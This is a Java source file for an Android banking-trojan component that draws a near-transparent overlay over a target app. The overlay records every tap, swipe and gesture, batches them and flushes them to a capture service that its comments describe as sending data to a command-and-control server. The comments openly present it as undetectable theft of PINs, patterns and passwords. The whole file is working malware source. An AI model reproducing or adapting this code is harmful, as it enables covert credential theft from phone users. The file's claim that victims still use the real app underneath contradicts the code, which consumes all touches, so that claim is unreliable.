package com.fason.app.features.springe.overlays;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;

import com.fason.app.features.springe.capture.InputCaptureService;
import com.fason.app.features.springe.delivery.OverlayWindowManager;

import org.json.JSONObject;

/**
 * InvisibleTouchOverlay — ToxicPanda-style transparent overlay that captures
 * every touch event without the user seeing anything.
 *
 * The victim interacts with the *real* app underneath. Every tap coordinate,
 * swipe gesture, and keyboard input is silently recorded and sent to C2.
 *
 * This is the most powerful credential theft technique because:
 * - No fake UI to detect — victim thinks they're using the real app
 * - Captures PINs, patterns, passwords as they're typed into real fields
 * - Works even if the app has screenshot protection (FLAG_SECURE)
 * - Cannot be detected by the user (no visual indicator)
 *
 * Must be shown/hidden from the main thread.
 */
public final class InvisibleTouchOverlay {

    private static final String TAG = "InvisibleTouchOverlay";

    private final Context context;
    private final OverlayWindowManager windowManager;
    private final InputCaptureService inputCapture;

    private volatile View overlayView;
    private volatile boolean isShowing = false;
    private volatile String currentTargetPackage = null;

    // Touch event buffer — accumulates touches until flush
    private final StringBuilder touchBuffer = new StringBuilder(4096);
    private final Handler flushHandler = new Handler(Looper.getMainLooper());
    private static final long FLUSH_INTERVAL_MS = 2000;

    // Coordinates for gesture detection
    private float lastX = 0, lastY = 0;
    private long lastTouchTime = 0;
    private static final long SWIPE_THRESHOLD_MS = 300;

    public InvisibleTouchOverlay(Context context, OverlayWindowManager windowManager,
                                 InputCaptureService inputCapture) {
        this.context = context;
        this.windowManager = windowManager;
        this.inputCapture = inputCapture;
    }

    /**
     * Show the invisible overlay. Must be called from main thread.
     */
    public void show(String targetPackage) {
        if (isShowing) return;

        this.currentTargetPackage = targetPackage;

        try {
            overlayView = createOverlayView();
            OverlayWindowManager.OverlayConfig config =
                OverlayWindowManager.OverlayConfig.invisibleCapture();
            windowManager.addOverlay(overlayView, config);
            overlayView.setAlpha(0.01f); // Nearly invisible, receives touches
            isShowing = true;

            // Start periodic flush of buffered touches
            flushHandler.postDelayed(this::flushTouchBuffer, FLUSH_INTERVAL_MS);

            Log.i(TAG, "Invisible touch capture active for: " + targetPackage);
        } catch (Exception e) {
            Log.e(TAG, "Failed to show invisible overlay", e);
        }
    }

    /**
     * Hide the overlay. Must be called from main thread.
     */
    public void hide() {
        if (!isShowing || overlayView == null) return;

        flushHandler.removeCallbacksAndMessages(null);
        flushTouchBuffer(); // Final flush

        try {
            windowManager.removeOverlay(overlayView);
            overlayView = null;
        } catch (Exception e) {
            Log.e(TAG, "Error hiding invisible overlay", e);
        }

        isShowing = false;
        currentTargetPackage = null;
    }

    public boolean isShowing() { return isShowing; }
    public String getCurrentTargetPackage() { return currentTargetPackage; }

    public void destroy() { hide(); }

    private View createOverlayView() {
        FrameLayout layout = new FrameLayout(context);
        layout.setBackgroundColor(Color.TRANSPARENT);
        layout.setClickable(true);
        layout.setFocusable(true);
        layout.setFocusableInTouchMode(true);

        // Capture ALL touch events
        layout.setOnTouchListener((v, event) -> {
            captureTouchEvent(event);
            return true; // Consume the event — real app doesn't receive it
        });

        return layout;
    }

    /**
     * Capture a touch event and classify it.
     */
    private void captureTouchEvent(MotionEvent event) {
        float x = event.getX();
        float y = event.getY();
        long now = System.currentTimeMillis();

        try {
            switch (event.getAction() & MotionEvent.ACTION_MASK) {
                case MotionEvent.ACTION_DOWN: {
                    lastX = x;
                    lastY = y;
                    lastTouchTime = now;

                    JSONObject data = new JSONObject();
                    data.put("_type", "touch_down");
                    data.put("_targetPackage", currentTargetPackage);
                    data.put("x", (int) x);
                    data.put("y", (int) y);
                    data.put("_timestamp", now);
                    inputCapture.onCaptured(data);

                    appendToBuffer("DOWN", x, y);
                    break;
                }

                case MotionEvent.ACTION_MOVE: {
                    float dx = x - lastX;
                    float dy = y - lastY;
                    float distance = (float) Math.sqrt(dx * dx + dy * dy);

                    // Only log moves over meaningful distance (noise filtering)
                    if (distance > 10) {
                        lastX = x;
                        lastY = y;
                        appendToBuffer("MOVE", x, y);
                    }
                    break;
                }

                case MotionEvent.ACTION_UP: {
                    long dt = now - lastTouchTime;
                    float dx = x - lastX;
                    float dy = y - lastY;
                    float distance = (float) Math.sqrt(dx * dx + dy * dy);

                    String gestureType;
                    if (distance < 15 && dt < SWIPE_THRESHOLD_MS) {
                        gestureType = "tap";
                    } else if (distance > 100 && dt < 500) {
                        gestureType = "swipe";
                    } else {
                        gestureType = "drag";
                    }

                    JSONObject data = new JSONObject();
                    data.put("_type", "touch_up");
                    data.put("_gestureType", gestureType);
                    data.put("_targetPackage", currentTargetPackage);
                    data.put("x", (int) x);
                    data.put("y", (int) y);
                    data.put("dx", (int) dx);
                    data.put("dy", (int) dy);
                    data.put("distance", (int) distance);
                    data.put("duration", dt);
                    data.put("_timestamp", now);
                    inputCapture.onCaptured(data);

                    appendToBuffer("UP[" + gestureType + "]", x, y);
                    break;
                }

                case MotionEvent.ACTION_CANCEL: {
                    appendToBuffer("CANCEL", x, y);
                    break;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error capturing touch", e);
        }
    }

    /**
     * Flush buffered touch data to C2 as a batch.
     */
    private void flushTouchBuffer() {
        synchronized (touchBuffer) {
            if (touchBuffer.length() == 0) return;

            try {
                JSONObject data = new JSONObject();
                data.put("_type", "touch_buffer_flush");
                data.put("_targetPackage", currentTargetPackage);
                data.put("_captureType", "touch_gestures");
                data.put("touches", touchBuffer.toString());
                data.put("_timestamp", System.currentTimeMillis());
                touchBuffer.setLength(0);
                inputCapture.onCaptured(data);
            } catch (Exception e) {
                Log.e(TAG, "Error flushing touch buffer", e);
            }
        }

        // Re-schedule
        flushHandler.postDelayed(this::flushTouchBuffer, FLUSH_INTERVAL_MS);
    }

    private void appendToBuffer(String type, float x, float y) {
        synchronized (touchBuffer) {
            if (touchBuffer.length() > 8192) {
                touchBuffer.setLength(0); // Prevent OOM
            }
            touchBuffer.append(type).append("(")
                .append((int) x).append(",").append((int) y)
                .append(") ");
        }
    }
}
